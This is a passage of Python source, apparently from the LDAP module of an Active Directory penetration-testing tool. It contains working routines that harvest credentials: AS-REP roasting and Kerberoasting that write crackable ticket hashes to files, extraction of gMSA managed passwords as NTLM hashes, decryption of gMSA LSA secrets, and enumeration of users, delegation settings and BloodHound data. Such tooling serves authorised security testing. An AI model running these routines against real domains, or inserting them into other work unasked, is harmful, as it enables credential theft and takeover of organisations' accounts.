                if item["type"] != "searchResEntry":
                    continue
                name = ""
                try:
                    for attribute in item["attributes"]:
                        if "name" in item["attributes"]:
                            name = item["attributes"][attribute]
                    self.logger.highlight(f"{name}")
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
            return

    def dc_list(self):
        # Building the search filter
        search_filter = "(&(objectCategory=computer)(primaryGroupId=516))"
        attributes = ["dNSHostName"]
        resp = self.search(search_filter, attributes, 0)

        for item in resp:
            if item["type"] != "searchResEntry":
                continue
            name = ""
            try:
                for attribute in item["attributes"]:
                    if "dNSHostName" in item["attributes"]:
                       name = item["attributes"][attribute]
                try:
                    ip_address = socket.gethostbyname(name.split(".")[0])
                    if ip_address is not True and name != "":
                        self.logger.highlight(f"{name} = {colored(ip_address, host_info_colors[0])}")
                except socket.gaierror:
                    self.logger.fail(f"{name} = Connection timeout")
            except Exception as e:
                self.logger.fail("Exception:", exc_info=True)
                self.logger.fail(f"Skipping item, cannot process due to error {e}")

    def active_users(self):
        if len(self.args.active_users) > 0:
            arg = True
            self.logger.debug(f"Dumping users: {', '.join(self.args.active_users)}")
            search_filter = "(sAMAccountType=805306368)" if self.username != "" else "(objectclass=*)"
            search_filter_args = f"(|{''.join(f'(sAMAccountName={user})' for user in self.args.active_users)})"
        else:
            arg = False
            self.logger.debug("Trying to dump all users")
            search_filter = "(sAMAccountType=805306368)" if self.username != "" else "(objectclass=*)"

        # default to these attributes to mirror the SMB --users functionality
        request_attributes = ["sAMAccountName", "description", "badPwdCount", "pwdLastSet", "userAccountControl"]
        resp = self.search(search_filter, request_attributes, sizeLimit=0)
        allusers = parse_result_attributes(resp)

        count = 0
        activeusers = []
        argsusers = []

        if arg:
            resp_args = self.search(search_filter_args, request_attributes, sizeLimit=0)
            users_args = parse_result_attributes(resp_args)
            # This try except for, if user gives a doesn't exist username. If it does, parsing process is crashing
            for i in range(len(self.args.active_users)):
                try:
                    argsusers.append(users_args[i])
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
        else:
            argsusers = allusers

        for user in allusers:
            user_account_control = user.get("userAccountControl")
            if user_account_control is not None:  # Check if user_account_control is not None
                account_control = "".join(user_account_control) if isinstance(user_account_control, list) else user_account_control  # If it's already a list
                account_disabled = int(account_control) & 2
                if not account_disabled:
                    count += 1
                    activeusers.append(user.get("sAMAccountName").lower())
            else:
                self.logger.debug(f"userAccountControl for user {user.get('sAMAccountName')} is None")

        if self.username == "":
            self.logger.display(f"Total records returned: {len(resp):d}")
            for item in resp_args:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                self.logger.highlight(f"{item['objectName']}")
            return
        self.logger.display(f"Total records returned: {count}, total {len(allusers) - count:d} user(s) disabled") if not arg else self.logger.display(f"Total records returned: {len(argsusers)}, Total {len(allusers) - count:d} user(s) disabled")
        self.logger.highlight(f"{'-Username-':<30}{'-Last PW Set-':<20}{'-BadPW-':<8}{'-Description-':<60}")

        for arguser in argsusers:
            pwd_last_set = arguser.get("pwdLastSet", "")  # Retrieves pwdLastSet directly and defaults to an empty string.
            if pwd_last_set:  # Checks if pwdLastSet is empty or not.
                parsed_pw_last_set = pwd_last_set[:19]
                if parsed_pw_last_set == "1601-01-01 00:00:00":
                    parsed_pw_last_set = "<never>"

            if arguser.get("sAMAccountName").lower() in activeusers and arg is False:
                self.logger.highlight(f"{arguser.get('sAMAccountName', ''):<30}{parsed_pw_last_set:<20}{arguser.get('badPwdCount', ''):<8}{arguser.get('description', ''):<60}")
            elif (arguser.get("sAMAccountName").lower() not in activeusers) and arg is True:
                self.logger.highlight(f"{arguser.get('sAMAccountName', '') + ' (Disabled)':<30}{parsed_pw_last_set:<20}{arguser.get('badPwdCount', ''):<8}{arguser.get('description', ''):<60}")
            elif (arguser.get("sAMAccountName").lower() in activeusers):
                self.logger.highlight(f"{arguser.get('sAMAccountName', ''):<30}{parsed_pw_last_set:<20}{arguser.get('badPwdCount', ''):<8}{arguser.get('description', ''):<60}")

    def asreproast(self):
        # if self.password == "" and self.nthash == "" and self.kerberos is False: 
        # # can't work because for POC purpose try_credentials() has been bypass => to be modified
        if self.password == "" and self.nthash == "" and self.kerberos is False and self.pfx is None and (self.key, self.cert) is None:
            return False
        # Building the search filter
        search_filter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(search_filter, attributes, sizeLimit=0)
        if resp is None:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []
            self.logger.display(f"Total of records returned {len(resp):d}")

            for item in resp:
                if item["type"] != "searchResEntry":
                    continue
                mustCommit = False
                sAMAccountName = ""
                memberOf = ""
                pwdLastSet = ""
                userAccountControl = 0
                lastLogon = "N/A"
                try:

                    attributes = item["attributes"]

                    for attribute in attributes.keys():
                        if attribute == "sAMAccountName":
                            sAMAccountName = str(attributes["sAMAccountName"])
                            mustCommit = True
                        elif attribute == "userAccountControl":
                            userAccountControl = str(attributes["userAccountControl"])
                        elif attribute == "memberOf":
                            memberOf = str(attributes["memberOf"][0])
                        elif attribute == "pwdLastSet":
                            pwdLastSet = "<never>" if str(attributes["pwdLastSet"]) == "1601-01-01 00:00:00+00:00" else str(attributes["pwdLastSet"]) 
                        elif attribute == "lastLogon":
                            lastLogon = "<never>" if str(attributes["lastLogon"]) == "1601-01-01 00:00:00+00:00" else str(attributes["lastLogon"])
                    if mustCommit is True:
                        answers.append(
                            [
                                sAMAccountName,
                                memberOf,
                                pwdLastSet,
                                lastLogon,
                                userAccountControl,
                            ]
                        )
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
            if len(answers) > 0:
                for user in answers:
                    hash_TGT = KerberosAttacks(self).get_tgt_asroast(user[0])
                    if hash_TGT:
                        self.logger.highlight(f"{hash_TGT}")
                        with open(self.args.asreproast, "a+") as hash_asreproast:
                            hash_asreproast.write(f"{hash_TGT}\n")
                return True
            else:
                self.logger.highlight("No entries found!")
        else:
            self.logger.fail("Error with the LDAP account used")

    def kerberoasting(self):
        # Building the search filter
        search_filter = "(&(servicePrincipalName=*)(!(objectCategory=computer)))"
        attributes = [
            "servicePrincipalName",
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(search_filter, attributes, 0)
        self.logger.debug(f"Search Filter: {search_filter}")
        self.logger.debug(f"Attributes: {attributes}")
        self.logger.debug(f"Response: {resp}")
        if not resp:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []

            for item in resp:
                if item["type"] != "searchResEntry":
                    continue
                mustCommit = False
                sAMAccountName = ""
                memberOf = ""
                SPNs = []
                pwdLastSet = ""
                userAccountControl = 0
                lastLogon = "N/A"
                delegation = ""
                try:
                    attributes = item["attributes"]

                    for attribute in attributes.keys():
                        if attribute == "sAMAccountName":
                            sAMAccountName = str(attributes["sAMAccountName"])
                            mustCommit = True
                        elif attribute == "userAccountControl":
                            userAccountControl = str(attributes["userAccountControl"])
                            if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                                delegation = "unconstrained"
                            elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                                delegation = "constrained"
                        elif attribute == "memberOf":
                            memberOf = str(attributes["memberOf"][0])
                        elif attribute == "pwdLastSet":
                            pwdLastSet = "<never>" if str(attributes["pwdLastSet"]) == "1601-01-01 00:00:00+00:00" else str(attributes["pwdLastSet"]) 
                        elif attribute == "lastLogon":
                            lastLogon = "<never>" if str(attributes["lastLogon"]) == "1601-01-01 00:00:00+00:00" else str(attributes["lastLogon"])
                        elif attribute == "servicePrincipalName":
                            SPNs = [str(spn) for spn in attributes["servicePrincipalName"]]

                    if mustCommit is True:
                        if int(userAccountControl) & UF_ACCOUNTDISABLE:
                            self.logger.highlight(f"Bypassing disabled account {sAMAccountName} ")
                        else:
                            answers += [[spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation] for spn in SPNs]
                except Exception as e:
                    nxc_logger.error(f"Skipping item, cannot process due to error {e!s}")

            if len(answers) > 0:
                self.logger.display(f"Total of records returned {len(answers):d}")
                TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
                self.logger.debug(f"TGT: {TGT}")
                if TGT:
                    dejavue = []
                    for (_SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, _delegation) in answers:
                        if sAMAccountName not in dejavue:
                            downLevelLogonName = self.targetDomain + "\\" + sAMAccountName

                            try:
                                principalName = Principal()
                                principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                                principalName.components = [downLevelLogonName]

                                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                                    principalName,
                                    self.domain,
                                    self.kdcHost,
                                    TGT["KDC_REP"],
                                    TGT["cipher"],
                                    TGT["sessionKey"],
                                )
                                r = KerberosAttacks(self).output_tgs(
                                    tgs,
                                    oldSessionKey,
                                    sessionKey,
                                    sAMAccountName,
                                    self.targetDomain + "/" + sAMAccountName,
                                )
                                self.logger.highlight(f"sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}")
                                self.logger.highlight(f"{r}")
                                if self.args.kerberoasting:
                                    with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
                                        hash_kerberoasting.write(r + "\n")
                                dejavue.append(sAMAccountName)
                            except Exception as e:
                                self.logger.debug("Exception:", exc_info=True)
                                self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
                    return True
                else:
                    self.logger.fail(f"Error retrieving TGT for {self.username}\\{self.domain} from {self.kdcHost}")
            else:
                self.logger.highlight("No entries found!")
        self.logger.fail("Error with the LDAP account used")

    def query(self):
        """
        Query the LDAP server with the specified filter and attributes.
        Example usage:
            --query "(sAMAccountName=Administrator)" "sAMAccountName pwdLastSet memberOf"
        """
        search_filter = self.args.query[0]
        attributes = [attr.strip() for attr in self.args.query[1].split(" ")]
        if len(attributes) == 1 and attributes[0] == "":
            attributes = None
        if not search_filter:
            self.logger.fail("No filter specified")
            return
        self.logger.debug(f"Querying LDAP server with filter: {search_filter} and attributes: {attributes}")
        try:
            resp = self.search(search_filter, attributes, 0)
        except LDAPFilterSyntaxError as e:
            self.logger.fail(f"LDAP Filter Syntax Error: {e}")
            return
        for item in resp:
            if item["type"] != "searchResEntry":
                continue
            self.logger.success(f"Response for object: {item['dn']}")
            for attribute in item["attributes"]:
                attr = f"{attribute}:"
                # if "memberOf" in attribute:
                #     vals = "\n".join(str(val) for val in item["attributes"][attribute])       
                if item["attributes"][attribute] == [] or "":          
                    continue
                elif "pwdLastSet" in attribute:
                    vals = str(item["attributes"][attribute])[:19]
                    if vals == "1601-01-01 00:00:00":
                        vals = "<never>"
                else:
                    vals = item["attributes"][attribute]

                if "SetOf: " in vals:
                    vals = vals.replace("SetOf: ", "")
                if isinstance(vals, list):
                    for val in vals:
                        self.logger.highlight(f"{attr:<20} {val}")
                        attr = ""
                else:
                    self.logger.highlight(f"{attr:<20} {vals}")

    def trusted_for_delegation(self):
        # Building the search filter
        search_filter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(search_filter, attributes, 0)

        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp:
            if item["type"] != "searchResEntry":
                continue
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            lastLogon = "N/A"
            try:
                attributes = item["attributes"]

                for attribute in attributes.keys():    
                    if attribute == "sAMAccountName":
                        sAMAccountName = str(attributes["sAMAccountName"])
                        mustCommit = True
                    elif attribute == "userAccountControl":
                        userAccountControl = str(attributes["userAccountControl"])
                    elif attribute == "memberOf":
                        memberOf = str(attributes["memberOf"][0])
                    elif attribute == "pwdLastSet":
                        pwdLastSet = "<never>" if str(attributes["pwdLastSet"]) == "1601-01-01 00:00:00+00:00" else str(attributes["pwdLastSet"]) 
                    elif attribute == "lastLogon":
                        lastLogon = "<never>" if str(attributes["lastLogon"]) == "1601-01-01 00:00:00+00:00" else str(attributes["lastLogon"])
                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e}")
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(value[0]) 
        else:
            self.logger.fail("No entries found!")

    def password_not_required(self):
        # Building the search filter
        search_filter = "(userAccountControl:1.2.840.113556.1.4.803:=32)"
        try:
            self.logger.debug(f"Search Filter={search_filter}")
            resp = self.ldapConnection.search(
                search_filter=search_filter,
                attributes=[
                    "sAMAccountName",
                    "pwdLastSet",
                    "MemberOf",
                    "userAccountControl",
                    "lastLogon",
                ],
                sizeLimit=0,
            )
        except Exception as e:
            return False
        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp:
            if item["type"] != "searchResEntry":
                continue
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            status = "enabled"
            lastLogon = "N/A"
            try:
                attributes = item["attributes"]

                for attribute in attributes.keys():
                    if attribute == "sAMAccountName":
                        sAMAccountName = str(attributes["sAMAccountName"])
                        mustCommit = True
                    elif attribute == "userAccountControl":
                        if int(attributes["userAccountControl"]) & 2:
                            status = "disabled"
                        userAccountControl = str(attributes["userAccountControl"])
                    elif attribute == "memberOf":
                        memberOf = str(attributes["memberOf"][0])
                    elif attribute == "pwdLastSet":
                        pwdLastSet = "<never>" if str(attributes["pwdLastSet"]) == "1601-01-01 00:00:00+00:00" else str(attributes["pwdLastSet"]) 
                    elif attribute == "lastLogon":
                        lastLogon = "<never>" if str(attributes["lastLogon"]) == "1601-01-01 00:00:00+00:00" else str(attributes["lastLogon"])
                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                            status,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e!s}")
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(f"User: {value[0]} Status: {value[5]}")
        else:
            self.logger.fail("No entries found!")

    def admin_count(self):
        # Building the search filter
        search_filter = "(adminCount=1)"
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(search_filter, attributes, 0)
        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp:
            if item["type"] != "searchResEntry":
                continue
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            lastLogon = "N/A"
            try:
                attributes = item["attributes"]
                for attribute in attributes.keys(): 
                    if attribute == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                        mustCommit = True
                    elif attribute == "userAccountControl":
                        userAccountControl = "0x%x" % int(attribute["vals"][0])
                    elif attribute == "memberOf":
                        memberOf = str(attribute["vals"][0])
                    elif attribute == "pwdLastSet":
                        pwdLastSet = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                    elif attribute == "lastLogon":
                        lastLogon = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e!s}")
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.fail("No entries found!")

    def gmsa(self):
        self.logger.display("Getting GMSA Passwords")
        search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
        gmsa_accounts = self.ldapConnection.search(
            search_filter=search_filter,
            attributes=[
                "sAMAccountName",
                "msDS-ManagedPassword",
                "msDS-GroupMSAMembership",
            ],
            sizeLimit=0,
            searchBase=self.baseDN
        )
        if gmsa_accounts:
            self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

            for item in gmsa_accounts:
                if item["type"] != "searchResEntry":
                    continue
                sAMAccountName = ""
                passwd = ""
                for attribute in item["attributes"]:
                    if "sAMAccountName" in attribute:
                        sAMAccountName = item["attributes"][attribute]
                    if "msDS-ManagedPassword" in attribute:
                        data = item["attributes"][attribute].asOctets()
                        blob = MSDS_MANAGEDPASSWORD_BLOB()
                        blob.fromString(data)
                        currentPassword = blob["CurrentPassword"][:-2]
                        ntlm_hash = MD4.new()
                        ntlm_hash.update(currentPassword)
                        passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {sAMAccountName:<20} NTLM: {passwd}")
        return True

    def decipher_gmsa_name(self, domain_name=None, account_name=None):
        # https://aadinternals.com/post/gmsa/
        gmsa_account_name = (domain_name + account_name).upper()
        self.logger.debug(f"GMSA name for {gmsa_account_name}")
        bin_account_name = gmsa_account_name.encode("utf-16le")
        bin_hash = hmac.new(bytes("", "latin-1"), msg=bin_account_name, digestmod=hashlib.sha256).digest()
        hex_letters = "0123456789abcdef"
        str_hash = ""
        for b in bin_hash:
            str_hash += hex_letters[b & 0x0F]
            str_hash += hex_letters[b >> 0x04]
        self.logger.debug(f"Hash2: {str_hash}")
        return str_hash

    def gmsa_convert_id(self):
        if self.args.gmsa_convert_id:
            if len(self.args.gmsa_convert_id) != 64:
                self.logger.fail("Length of the gmsa id not correct :'(")
            else:
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldapConnection.search(
                    search_filter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                    searchBase=self.baseDN,
                )
                if gmsa_accounts:
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

                    for item in gmsa_accounts:
                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                            continue
                        sAMAccountName = ""
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                                if self.decipher_gmsa_name(self.domain.split(".")[0], sAMAccountName[:-1]) == self.args.gmsa_convert_id:
                                    self.logger.highlight(f"Account: {sAMAccountName:<20} ID: {self.args.gmsa_convert_id}")
                                    break
        else:
            self.logger.fail("No string provided :'(")

    def gmsa_decrypt_lsa(self):
        if self.args.gmsa_decrypt_lsa:
            if "_SC_GMSA_{84A78B8C" in self.args.gmsa_decrypt_lsa:
                gmsa = self.args.gmsa_decrypt_lsa.split("_")[4].split(":")
                gmsa_id = gmsa[0]
                gmsa_pass = gmsa[1]
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldapConnection.search(
                    search_filter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                    searchBase=self.baseDN,
                )
                if gmsa_accounts:
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

                    for item in gmsa_accounts:
                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                            continue
                        sAMAccountName = ""
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                                if self.decipher_gmsa_name(self.domain.split(".")[0], sAMAccountName[:-1]) == gmsa_id:
                                    gmsa_id = sAMAccountName
                                    break
                # convert to ntlm
                data = bytes.fromhex(gmsa_pass)
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(data)
                currentPassword = blob["CurrentPassword"][:-2]
                ntlm_hash = MD4.new()
                ntlm_hash.update(currentPassword)
                passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {gmsa_id:<20} NTLM: {passwd}")
        else:
            self.logger.fail("No string provided :'(")

    def bloodhound(self):
        auth = ADAuthentication(
            username=self.username,
            password=self.password,
            domain=self.domain,
            lm_hash=self.nthash,
            nt_hash=self.nthash,
            aeskey=self.aesKey,
            kdc=self.kdcHost,
            auth_method="auto",
        )
        ad = AD(
            auth=auth,
            domain=self.domain,
            nameserver=self.args.dns_server,
            dns_tcp=self.args.dns_tcp,
            dns_timeout=self.args.dns_timeout,
        )
        collect = resolve_collection_methods("Default" if not self.args.collection else self.args.collection)
        if not collect:
            return
        self.logger.highlight("Resolved collection methods: " + ", ".join(list(collect)))

        self.logger.debug("Using DNS to retrieve domain information")
        ad.dns_resolve(domain=self.domain)

        if self.args.kerberos:
            self.logger.highlight("Using kerberos auth without ccache, getting TGT")
            auth.get_tgt()
        if self.args.use_kcache:
            self.logger.highlight("Using kerberos auth from ccache")
            auth.load_ccache()

        timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S") + "_"
        bloodhound = BloodHound(ad, self.hostname, self.host, self.port)
        bloodhound.connect()

        bloodhound.run(
            collect=collect,
            num_workers=10,
            disable_pooling=False,
            timestamp=timestamp,
            fileNamePrefix=self.output_filename.split("/")[-1],
            computerfile=None,
            cachefile=None,
            exclude_dcs=False,
        )

        self.output_filename += f"_{timestamp}"

        self.logger.highlight(f"Compressing output into {self.output_filename}bloodhound.zip")
        list_of_files = os.listdir(os.getcwd())
        with ZipFile(self.output_filename + "bloodhound.zip", "w") as z:
            for each_file in list_of_files:
                if each_file.startswith(self.output_filename.split("/")[-1]) and each_file.endswith("json"):
                    z.write(each_file)
                    os.remove(each_file)
